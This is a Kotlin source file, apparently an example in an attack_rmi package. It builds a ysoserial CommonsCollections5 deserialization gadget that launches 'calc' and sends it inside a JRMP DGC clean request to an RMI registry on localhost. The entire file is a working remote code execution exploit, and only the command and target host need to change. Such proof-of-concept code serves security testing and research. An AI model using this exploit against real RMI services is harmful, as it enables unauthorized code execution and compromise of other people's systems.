package example.attack_rmi

import top.ceclin.jrmp.DgcV1
import top.ceclin.jrmp.request.Request
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.singleOp
import ysoserial.payloads.CommonsCollections5
import java.net.Socket
import java.rmi.registry.Registry

fun main() {
    val gadget = CommonsCollections5().getObject("calc")
    Socket("127.0.0.1", Registry.REGISTRY_PORT).use {
        it.tcpNoDelay = true
        val request: Request = DgcV1.clean {
            writeObject(gadget)
        }.singleOp().request()
        it.outputStream.write(request.value)
    }
}
